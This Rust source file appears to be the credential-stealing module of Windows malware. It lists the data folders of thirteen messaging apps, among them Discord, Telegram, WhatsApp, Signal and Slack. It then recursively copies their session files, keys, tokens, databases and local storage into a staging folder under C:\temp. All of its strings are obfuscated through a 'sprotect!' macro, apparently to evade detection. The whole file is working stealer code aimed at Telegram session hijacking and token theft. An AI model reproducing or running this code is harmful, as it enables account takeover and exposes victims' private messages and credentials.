use crate::sprotect;
use std::fs;
use std::path::PathBuf;
use winapi::um::winreg::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
use winapi::um::winnt::{KEY_READ, REG_SZ};
use winapi::shared::minwindef::{HKEY, DWORD};
use std::ptr;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

struct MessagingApp {
    name: String,
    app_paths: Vec<PathBuf>,
    target_files: Vec<String>,
    target_directories: Vec<String>,
}

async fn get_appdata_paths() -> (PathBuf, PathBuf) {
    let home = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    let roaming_path = PathBuf::from(&home).join(sprotect!("AppData")).join(sprotect!("Roaming"));
    let local_path = PathBuf::from(&home).join(sprotect!("AppData")).join(sprotect!("Local"));
    (roaming_path, local_path)
}

async fn get_messaging_apps() -> Vec<MessagingApp> {
    let (roaming_path, local_path) = get_appdata_paths().await;
    let mut apps = Vec::new();

    apps.push(MessagingApp {
        name: sprotect!("Discord").to_string(),
        app_paths: vec![
            roaming_path.join(sprotect!("Discord")),
            roaming_path.join(sprotect!("discordcanary")),
            roaming_path.join(sprotect!("discordptb")),
            roaming_path.join(sprotect!("Lightcord")),
        ],
        target_files: vec![
            sprotect!("*.log").to_string(),
            sprotect!("*.ldb").to_string(),
            sprotect!("*.sqlite").to_string(),
        ],
        target_directories: vec![
            sprotect!("Local Storage").to_string(),
            sprotect!("Session Storage").to_string(),
            sprotect!("IndexedDB").to_string(),
        ],
    });

    apps.push(MessagingApp {
        name: sprotect!("Telegram").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Telegram Desktop"))],
        target_files: vec![
            sprotect!("*.session").to_string(),
            sprotect!("key_*").to_string(),
            sprotect!("D877F783D5D3EF8C*").to_string(),
            sprotect!("map*").to_string(),
        ],
        target_directories: vec![sprotect!("tdata").to_string()],
    });

    apps.push(MessagingApp {
        name: sprotect!("WhatsApp").to_string(),
        app_paths: vec![
            local_path.join(sprotect!("WhatsApp")),
            local_path.join(sprotect!("Packages")).join(sprotect!("5319275A.WhatsAppDesktop_cv1g1gvanyjgm")),
        ],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("*.log").to_string(),
        ],
        target_directories: vec![
            sprotect!("LocalStorage").to_string(),
            sprotect!("IndexedDB").to_string(),
        ],
    });

    apps.push(MessagingApp {
        name: sprotect!("Signal").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Signal"))],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("config.json").to_string(),
            sprotect!("*.key").to_string(),
        ],
        target_directories: vec![
            sprotect!("sql").to_string(),
            sprotect!("attachments.noindex").to_string(),
        ],
    });

    apps.push(MessagingApp {
        name: sprotect!("Viber").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("ViberPC"))],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("viber.db").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    apps.push(MessagingApp {
        name: sprotect!("Element").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Element"))],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("*.log").to_string(),
        ],
        target_directories: vec![
            sprotect!("IndexedDB").to_string(),
            sprotect!("Local Storage").to_string(),
        ],
    });

    apps.push(MessagingApp {
        name: sprotect!("Skype").to_string(),
        app_paths: vec![
            roaming_path.join(sprotect!("Skype")),
            local_path.join(sprotect!("Packages")).join(sprotect!("Microsoft.SkypeApp_kzf8qxf38zg5c")),
        ],
        target_files: vec![
            sprotect!("main.db").to_string(),
            sprotect!("*.db").to_string(),
            sprotect!("config.xml").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    apps.push(MessagingApp {
        name: sprotect!("ICQ").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("ICQ"))],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("*.dat").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    apps.push(MessagingApp {
        name: sprotect!("Pidgin").to_string(),
        app_paths: vec![roaming_path.join(sprotect!(".purple"))],
        target_files: vec![
            sprotect!("accounts.xml").to_string(),
            sprotect!("*.xml").to_string(),
            sprotect!("*.db").to_string(),
        ],
        target_directories: vec![
            sprotect!("logs").to_string(),
            sprotect!("certificates").to_string(),
        ],
    });

    apps.push(MessagingApp {
        name: sprotect!("Tox").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("tox"))],
        target_files: vec![
            sprotect!("*.tox").to_string(),
            sprotect!("*.ini").to_string(),
            sprotect!("*.dat").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    apps.push(MessagingApp {
        name: sprotect!("TeamSpeak").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("TS3Client"))],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("settings.db").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    apps.push(MessagingApp {
        name: sprotect!("Slack").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Slack"))],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("*.log").to_string(),
        ],
        target_directories: vec![
            sprotect!("IndexedDB").to_string(),
            sprotect!("Local Storage").to_string(),
        ],
    });

    apps.push(MessagingApp {
        name: sprotect!("Zoom").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Zoom"))],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("zoomVideoConf.exe.log").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    apps
}

async fn copy_file_if_exists(src: &PathBuf, dest_dir: &PathBuf) -> bool {
    if src.exists() && src.is_file() {
        if let Some(filename) = src.file_name() {
            let dest_path = dest_dir.join(filename);
            if let Some(parent) = dest_path.parent() {
                fs::create_dir_all(parent).ok();
            }
            fs::copy(src, dest_path).is_ok()
        } else {
            false
        }
    } else {
        false
    }
}

async fn copy_directory_if_exists(src: &PathBuf, dest: &PathBuf) -> bool {
    if src.exists() && src.is_dir() {
        copy_directory_recursive(src, dest)
    } else {
        false
    }
}

fn copy_directory_recursive(src: &PathBuf, dest: &PathBuf) -> bool {
    if fs::create_dir_all(dest).is_err() {
        return false;
    }

    if let Ok(entries) = fs::read_dir(src) {
        for entry in entries.flatten() {
            let src_path = entry.path();
            let dest_path = dest.join(entry.file_name());

            if src_path.is_dir() {
                copy_directory_recursive(&src_path, &dest_path);
            } else {
                fs::copy(&src_path, &dest_path).ok();
            }
        }
        true
    } else {
        false
    }
}

fn find_pattern_files(dir: &PathBuf, pattern: &str) -> Vec<PathBuf> {
    let mut files = Vec::new();
    if !dir.exists() {
        return files;
    }

    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                if let Some(filename) = path.file_name() {
                    if let Some(filename_str) = filename.to_str() {
                        if pattern_matches(filename_str, pattern) {
                            files.push(path);
                        }
                    }
                }
            } else if path.is_dir() {
                let mut subfiles = find_pattern_files(&path, pattern);
                files.append(&mut subfiles);
            }
        }
    }
    files
}

fn pattern_matches(filename: &str, pattern: &str) -> bool {
    if pattern == sprotect!("*") {
        return true;
    }
    if pattern.starts_with(sprotect!("*").as_str()) && pattern.ends_with(sprotect!("*").as_str()) {
        let middle = &pattern[1..pattern.len()-1];
        return filename.contains(middle);
    }
    if pattern.starts_with(sprotect!("*").as_str()) {
        let suffix = &pattern[1..];
        return filename.ends_with(suffix);
    }
    if pattern.ends_with(sprotect!("*").as_str()) {
        let prefix = &pattern[..pattern.len()-1];
        return filename.starts_with(prefix);
    }
    filename == pattern
}

pub async fn extract_messaging_apps() -> Result<(), Box<dyn std::error::Error>> {
    let base_output = PathBuf::from(sprotect!("C:\\temp\\extract\\apps"));
    let apps = get_messaging_apps().await;

    for app in apps {
        let app_output_dir = base_output.join(&app.name);
        fs::create_dir_all(&app_output_dir).ok();

        let mut found_data = false;

        for app_path in app.app_paths {
            if !app_path.exists() {
                continue;
            }

            for target_file in &app.target_files {
                let files = find_pattern_files(&app_path, target_file);
                for file in files {
                    if copy_file_if_exists(&file, &app_output_dir).await {
                        found_data = true;
                    }
                }
            }

            for target_dir in &app.target_directories {
                if target_dir == &sprotect!("*") {
                    if copy_directory_if_exists(&app_path, &app_output_dir.join(app_path.file_name().unwrap_or_default())).await {
                        found_data = true;
                    }
                } else {
                    let full_target_path = app_path.join(target_dir);
                    if copy_directory_if_exists(&full_target_path, &app_output_dir.join(target_dir)).await {
                        found_data = true;
                    }
                }
            }
        }

        if !found_data {
            fs::remove_dir_all(&app_output_dir).ok();
        }
    }

    Ok(())
}